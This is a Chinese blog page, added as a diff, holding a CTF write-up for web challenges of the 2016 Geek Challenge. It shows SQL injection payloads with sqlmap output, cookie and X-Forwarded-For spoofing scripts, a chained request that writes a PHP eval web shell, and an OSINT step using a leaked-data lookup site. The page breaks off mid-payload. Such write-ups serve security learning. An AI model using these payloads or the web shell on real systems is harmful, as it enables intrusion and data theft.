@@ -1,0 +1,1254 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|sans-serif:300,300italic,400,400italic,700,700italic|Lato:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Writeup," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="RcoIl的窝" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.png?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="12345678910111213RcoIl@kali:~$ lsteamInfo  baseInfoRcoIl@kali:~$ cat teamInfo战队名称:RcoIl战队hash:7cfe3df08ca8d03c8767f0e5c88a636f成员：RcoIlRcoIl@kali:~$ cat baseInfo基本信息:姓名:个人分数:3970学号:学院:手机号码:">
+<meta name="keywords" content="CTF,Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第七届极客大挑战">
+<meta property="og:url" content="http://rcoil.me/2016/10/第七届极客大挑战/index.html">
+<meta property="og:site_name" content="RcoIl的窝">
+<meta property="og:description" content="12345678910111213RcoIl@kali:~$ lsteamInfo  baseInfoRcoIl@kali:~$ cat teamInfo战队名称:RcoIl战队hash:7cfe3df08ca8d03c8767f0e5c88a636f成员：RcoIlRcoIl@kali:~$ cat baseInfo基本信息:姓名:个人分数:3970学号:学院:手机号码:">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-08-01T15:57:55.527Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第七届极客大挑战">
+<meta name="twitter:description" content="12345678910111213RcoIl@kali:~$ lsteamInfo  baseInfoRcoIl@kali:~$ cat teamInfo战队名称:RcoIl战队hash:7cfe3df08ca8d03c8767f0e5c88a636f成员：RcoIlRcoIl@kali:~$ cat baseInfo基本信息:姓名:个人分数:3970学号:学院:手机号码:">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '6230266985318450000',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://rcoil.me/2016/10/第七届极客大挑战/"/>
+
+
+
+
+
+  <title> 第七届极客大挑战 | RcoIl的窝 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ce3d1967864bac5f69f1c1a6042e5577";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">RcoIl的窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-count">
+          <a href="/count" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa fa-free-code-camp"></i> <br />
+            
+            阅读榜
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://rcoil.me/2016/10/第七届极客大挑战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="RcoIl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RcoIl的窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                第七届极客大挑战
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-10-10T01:09:05+08:00">
+                2016-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2016/10/第七届极客大挑战/" class="leancloud_visitors" data-flag-title="第七届极客大挑战">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                <!--
+				<i class="fa fa-eye"></i>
+				-->
+				<i class="fa fa-thermometer-three-quarters" aria-hidden="true"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">RcoIl@kali:~$ ls</div><div class="line">teamInfo  baseInfo</div><div class="line">RcoIl@kali:~$ cat teamInfo</div><div class="line">战队名称:RcoIl</div><div class="line">战队hash:7cfe3df08ca8d03c8767f0e5c88a636f</div><div class="line">成员：RcoIl</div><div class="line">RcoIl@kali:~$ cat baseInfo</div><div class="line">基本信息:</div><div class="line">姓名:</div><div class="line">个人分数:3970</div><div class="line">学号:</div><div class="line">学院:</div><div class="line">手机号码:</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web-1-score-50"><a href="#web-1-score-50" class="headerlink" title="web_1(score:50)"></a>web_1(score:50)</h3><p>来搞web了，先瞅瞅基础姿势 <a href="http://web.sycsec.com/a59817b3061870c0/" target="_blank" rel="external">http://web.sycsec.com/a59817b3061870c0/</a></p>
+<p>解法：打开网址发现是一张图片，图片上说明flag在别的地方，使用burpsuite进行抓包，在Response中即可看到flag<br>flag：SYC{This_1s_Http_he4der}</p>
+<h3 id="web-2-score-50"><a href="#web-2-score-50" class="headerlink" title="web_2(score:50)"></a>web_2(score:50)</h3><p>来搞web了，先瞅瞅基础姿势 <a href="http://web.sycsec.com/ce9b3a20d290fbc8/" target="_blank" rel="external">http://web.sycsec.com/ce9b3a20d290fbc8/</a></p>
+<p>解法：打开网址，看到的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Hello guest@geekgame</div><div class="line">Welcome to GeekGame2016@Syclover</div><div class="line">You are not admin,I am sorry you can&apos;t see the flag</div></pre></td></tr></table></figure></p>
+<p>所以是要admin用户登录，但是有没有登录框，所以就cookie方面。<br>用Firefox将cookie中的Cookie: whoami=guest%40geekgame; root=o;改成Cookie: whoami=admin%40geekgame; root=1;，刷新页面<br>flag：SYC{Welc0me_b4ck_4dm1n}</p>
+<h3 id="Social-Engineering-score-200"><a href="#Social-Engineering-score-200" class="headerlink" title="Social Engineering(score:200)"></a>Social Engineering(score:200)</h3><p>有一天我捕了一只狗师傅，嘴里叼着一张纸，纸上赫然写着：<a href="http://web.sycsec.com/36da077bd47665ae/" target="_blank" rel="external">http://web.sycsec.com/36da077bd47665ae/</a> (解题不需要联系题目邮箱和电话号码，请不要试图联系题目的邮箱和电话号码)</p>
+<p>解法：看到题目，社会工程学。<br>fun678@126.com<br>13904011607<br>我是一个有贴吧的男人！<br>到70sec社工库查询两个信息，都看到肖力这个名字，然后到贴吧里面搜这个肖力吧—看了帖子的日期，有个是近期的，而且还有个扣扣贴出来3077791373，加了这个扣扣为好友，看了信息确实是和比赛有关的，看了资料没见什么有用的信息，翻空间，最后在留言板哪里看到了这样一句话：听说域名的注册人联系号码就是flag诶！！！<br>但是不知道是哪个域名，那就查吧。查了主页的，发现注册人是叫胡浪宇邮箱：casperkid.syclover@gmail.com。然后没有什么信息了。google了一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name</div><div class="line">Syclover Aries</div><div class="line">Phone number</div><div class="line">+86.13412341234</div><div class="line">Address</div><div class="line">CUIT Syclover ChengDu SiChuan 610000 CN</div></pre></td></tr></table></figure></p>
+<p>flag：SYC{13412341234}</p>
+<h3 id="sqli1-score-100"><a href="#sqli1-score-100" class="headerlink" title="sqli1(score:100)"></a>sqli1(score:100)</h3><p>呃，听说这个和数据库有关呢-，- <a href="http://web.sycsec.com/d03e52c272e42e7c/" target="_blank" rel="external">http://web.sycsec.com/d03e52c272e42e7c/</a></p>
+<p>解法：看题目，是注入。看源代码，发现Tip:sycid<br>URL：<a href="http://web.sycsec.com/d03e52c272e42e7c/?sycid=" target="_blank" rel="external">http://web.sycsec.com/d03e52c272e42e7c/?sycid=</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">http://web.sycsec.com/d03e52c272e42e7c/?sycid=1</div><div class="line">Good Luck！Tip:sycid</div><div class="line">select * from syc where sycid=1</div><div class="line">1-&gt;pwnpwnpwn!-&gt;0xmuhe</div><div class="line">http://web.sycsec.com/d03e52c272e42e7c/?sycid=2</div><div class="line">Good Luck！Tip:sycid</div><div class="line">select * from syc where sycid=2</div><div class="line">2-&gt;mushifuzuishuai-&gt;Lemon</div><div class="line">http://web.sycsec.com/d03e52c272e42e7c/?sycid=3</div><div class="line">Good Luck！Tip:sycid</div><div class="line">select * from syc where sycid=3</div><div class="line">3-&gt;wozuishuai-&gt;[+.+]</div></pre></td></tr></table></figure></p>
+<p>然而，这些信息好像在手工上没什么用处，试试用sqlmap跑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">sqlmap resumed the following injection point(s) from stored session:</div><div class="line">---</div><div class="line">Parameter: sycid (GET)</div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</div><div class="line">    Payload: sycid=1 AND SLEEP(5)</div><div class="line"> </div><div class="line">    Type: UNION query</div><div class="line">    Title: Generic UNION query (NULL) - 3 columns</div><div class="line">    Payload: sycid=-2990 UNION ALL SELECT NULL,NULL,CONCAT(0x716a626271,0x6d6161</div><div class="line">6c7255756242696b476258515864586674567a6e66794d707771564e6b526f73704a70416b,0x717</div><div class="line">8716271)-- oPDy</div><div class="line">---</div><div class="line">[21:52:02] [INFO] the back-end DBMS is MySQL</div><div class="line">web application technology: PHP 5.3.3</div><div class="line">back-end DBMS: MySQL &gt;= 5.0.12</div><div class="line">------------------------------------------------------------------------------------</div><div class="line">Database: sycsqli1</div><div class="line">Table: #FL4G#</div><div class="line">[1 entry]</div><div class="line">+--------------------------+</div><div class="line">| flag                     |</div><div class="line">+--------------------------+</div><div class="line">| SYC&#123;Sqli_1s_Not_So_Hard&#125; |</div><div class="line">+--------------------------+</div></pre></td></tr></table></figure></p>
+<h3 id="sqli2-score-150"><a href="#sqli2-score-150" class="headerlink" title="sqli2(score:150)"></a>sqli2(score:150)</h3><p>我是萌萌哒sqli2：<a href="http://web.sycsec.com/a2274e0e500459f7/" target="_blank" rel="external">http://web.sycsec.com/a2274e0e500459f7/</a></p>
+<p>解法：一个登陆框，应该是post注入。<br>试了试，是在username和password存在，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload：&apos;%2b(select*from(select(sleep(20)))a)%2b&apos;</div></pre></td></tr></table></figure></p>
+<p>这种还是老老实实的抓包丢到sqlmap里面跑吧。<br>但是解不出来，应该是有限制的，抓包修改了debug的值，出现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Tip: Only 1 row returned can you get flag.</div><div class="line">只有一行返回才能拿到flag</div></pre></td></tr></table></figure></p>
+<p>这时候想起来，post注入不是还有另一种，不用抓包的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;http://web.sycsec.com/a2274e0e500459f7/login.php&quot; --data &quot;username=a&amp;password=a&amp;debug=1&quot;</div><div class="line"> </div><div class="line">sqlmap resumed the following injection point(s) from stored session:</div><div class="line">---</div><div class="line">Parameter: username (POST)</div><div class="line">    Type: error-based</div><div class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</div><div class="line">    Payload: username=a&apos; AND (SELECT 7336 FROM(SELECT COUNT(*),CONCAT(0x7171717071,(SELECT (ELT(7336=7336,1))),0x7176767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &apos;ZrQZ&apos;=&apos;ZrQZ&amp;password=a&amp;debug=1</div><div class="line">---</div><div class="line">[12:02:44] [INFO] the back-end DBMS is MySQL</div><div class="line">back-end DBMS: MySQL &gt;= 5.0</div><div class="line">---------------------------------------------------------------------------------------------</div><div class="line">Database: sycsqli2</div><div class="line">Table: users</div><div class="line">[2 entries]</div><div class="line">+----------+----------+</div><div class="line">| username | password |</div><div class="line">+----------+----------+</div><div class="line">| admin    | 23333    |</div><div class="line">| guest    | welcome  |</div><div class="line">+----------+----------+</div><div class="line"> </div><div class="line">Congrats, Flag is: SYC&#123;G00d_K33p_Trying_Wish_U_Success&#125;</div></pre></td></tr></table></figure></p>
+<p>另一种方法：(修改post提交，简单说就是万能密码)<br>payload：’ union select 1,1# 或 admin’ or ‘1’=’1</p>
+<h3 id="127-0-0-x-score-200"><a href="#127-0-0-x-score-200" class="headerlink" title="127.0.0.x(score:200)"></a>127.0.0.x(score:200)</h3><p>落雨声滴答滴滴,回荡着轻声细语:<a href="http://game.sycsec.com:50080/69e57206e1bc2a23/" target="_blank" rel="external">http://game.sycsec.com:50080/69e57206e1bc2a23/</a></p>
+<p>解法：查看源代码发现一串base64加密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS5oay93ZWJocD9obD16aC1DTiZzb3VyY2VpZD1jbmhwJmd3c19yZD1zc2wjbmV3d2luZG93PTEmc2FmZT1zdHJpY3QmaGw9emgtQ04mcT0xMjcuMC4wLjI=</div><div class="line">解密得到</div><div class="line">https://www.google.com.hk/webhp?hl=zh-CN&amp;sourceid=cnhp&amp;gws_rd=ssl#newwindow=1&amp;safe=strict&amp;hl=zh-CN&amp;q=127.0.0.2</div></pre></td></tr></table></figure></p>
+<p>是查询127.0.0.2，但是127.0.0.1–255的结果不都一样的吗，然后就伪造IP个个尝试访问，发现每个返回滴滴的个数都不一样，所以写个脚本遍历1–255这个段，引用一航同学的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"># coding:utf8</div><div class="line">import requests</div><div class="line">url = &quot;http://game.sycsec.com:50080/69e57206e1bc2a23/&quot;</div><div class="line">headers = &#123;</div><div class="line">          &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;,</div><div class="line">          &apos;Accept-Encoding&apos;:&apos;gzip, deflate, sdch&apos;,</div><div class="line">          &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8&apos;,</div><div class="line">          &apos;Cache-Control&apos;:&apos;no-cache&apos;,</div><div class="line">          &apos;Connection&apos;:&apos;keep-alive&apos;,</div><div class="line">          &apos;Cookie&apos;:&apos;__cfduid=dd80d162f768e8bc3d8564f32286b69301476092200&apos;,</div><div class="line">          &apos;Host&apos;:&apos;game.sycsec.com:50080&apos;,</div><div class="line">          &apos;Pragma&apos;:&apos;no-cache&apos;,</div><div class="line">          &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;,</div><div class="line">          &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/53.0.2785.116 Safari/537.36&apos;,</div><div class="line">          &apos;X-Forwarded-For&apos;:&apos;&apos;</div><div class="line">      &#125;</div><div class="line">s = requests.Session()</div><div class="line">for i in range(0,256):</div><div class="line">  ip = &quot;127.0.0.&quot; + str(i)</div><div class="line">  headers[&apos;X-Forwarded-For&apos;] = ip</div><div class="line">  response = s.get(url, headers=headers)</div><div class="line">  print ip + &quot;\t&quot; + response.text</div></pre></td></tr></table></figure></p>
+<p>跑完之后我们对打印出的数据进行分析 :<br>首先去掉每次请求返回的重复数据<br>然后通览全文 , 直接发现没有被去掉的就是flag.<br>当然，也可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">url = &apos;http://game.sycsec.com:50080/69e57206e1bc2a23/&apos;</div><div class="line">for i in xrange(1,256):</div><div class="line">        h = &#123;&apos;X-Forwarded-For&apos;:&apos;127.0.0.&apos;+str(i)&#125;</div><div class="line">        rep = requests.get(url,headers=h)</div><div class="line">        if &apos;SYC&apos; in rep.content:</div><div class="line">                print rep.content</div><div class="line">                break</div></pre></td></tr></table></figure></p>
+<p>flag：SYC{Shan_Dong_Ren_Xiong_Qi}</p>
+<h3 id="php-is-fun-score-200"><a href="#php-is-fun-score-200" class="headerlink" title="php_is_fun(score:200)"></a>php_is_fun(score:200)</h3><p>phpinfo() is disabled; <a href="http://game.sycsec.com:50084/" target="_blank" rel="external">http://game.sycsec.com:50084/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(isset($_GET) &amp;&amp; !empty($_GET))&#123;</div><div class="line">    $url = $_GET[&apos;file&apos;];</div><div class="line">    $path = &quot;upload/&quot;.$_GET[&apos;path&apos;];</div><div class="line">&#125;else&#123;</div><div class="line">    show_source(__FILE__);</div><div class="line">    exit();</div><div class="line">&#125;</div><div class="line"> </div><div class="line">if(strpos($path,&apos;..&apos;) &gt; -1)&#123;</div><div class="line">    die(&apos;SYCwaf!&apos;);</div><div class="line">&#125;</div><div class="line"> </div><div class="line">if(strpos($url,&apos;http://127.0.0.1/&apos;) === 0)&#123;</div><div class="line">    file_put_contents($path, file_get_contents($url));</div><div class="line">    echo &quot;console.log($path update successed!)&quot;;</div><div class="line">&#125;else&#123;</div><div class="line">    echo &quot;Hello.Geeker&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>解法：在服务器端访问以<a href="http://127.0.0.1/开头的一个页面" target="_blank" rel="external">http://127.0.0.1/开头的一个页面</a> ,<br>将页面的内容保存到服务器的web目录下的upload文件夹下，总的来说大概就是上传获取。<br>(过程的payload显示得莫名其妙，就删掉了)<br>最后看了一航同学的payload，发现是编码问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%3Ffile%3Dindex.php%26path%3D%3C?php%2520eval($_POST[%27admin%27]);?%3E&amp;path=rcoil.php</div></pre></td></tr></table></figure></p>
+<p>最后连一句话读upload下的内容<br>flag：SYC{3992a1e498d69161}<br>饶了个弯将一句话才写进去</p>
+<h3 id="撸啊撸-score-300"><a href="#撸啊撸-score-300" class="headerlink" title="撸啊撸(score:300)"></a>撸啊撸(score:300)</h3><p>喜欢玩LOL么 <a href="http://lol.sycsec.com" target="_blank" rel="external">http://lol.sycsec.com</a></p>
+<p>解法：貌似也是有注入的，在Referer，但是前面已经两道注入，但是又发现有个download.php,尝试下download.php可以下载源码，然后下载display.php,在里面发现config.inc.php，下载下来，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    return array(</div><div class="line">        &apos;db_host&apos; =&gt; &apos;localhost&apos;,</div><div class="line">        &apos;db_user&apos; =&gt; &apos;syclol&apos;,</div><div class="line">        &apos;db_pwd&apos; =&gt; &apos;fJBGpEfu3wWLvNHB&apos;,</div><div class="line">        &apos;database&apos; =&gt; &apos;syclol&apos;</div><div class="line">    );</div></pre></td></tr></table></figure></p>
+<p>数据库的链接所需数据。<br>在api.php中发现执行Sql查询的语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;</div><div class="line">$result = mysqli_query($conn,$sql);</div></pre></td></tr></table></figure></p>
+<p>既然是程序和用户交互的地方，因为这种地方在参数传递的时候没有对参数的类型和正确性进行判断，那就会留给我们利用的余地。<br>我们再看看这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$check = is_numeric($img_num) and is_numeric($img_first);</div><div class="line"> </div><div class="line">if (!$check)&#123;</div><div class="line">    $img_num = intval($img_num);</div><div class="line">    $img_first = intval($img_first);</div></pre></td></tr></table></figure></p>
+<p>根据运算优先级知道，$check 这个变量的值就只取决于 $img_num.所以只要满足$img_num，就相当于$check也满足了。而剩下的$img_first就可以用来构造我们所需要的语句了。<br>构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,2--+</div><div class="line"> </div><div class="line">http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select database(),version()--+</div><div class="line">结果：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;syclol&quot;,&quot;path&quot;:&quot;5.1.71&quot;&#125;]&#125;</div><div class="line">----&gt;mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息</div><div class="line"> </div><div class="line">http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,group_concat(schema_name) from information_schema.schemata--+</div><div class="line">爆出所有的库名：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;path&quot;:&quot;information_schema,syclol&quot;&#125;]&#125;</div><div class="line"> </div><div class="line">http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&apos;syclol&apos;--+</div><div class="line">爆出所有表名：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;path&quot;:&quot;images&quot;&#125;]&#125;</div><div class="line"> </div><div class="line">http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&apos;images&apos;--+</div><div 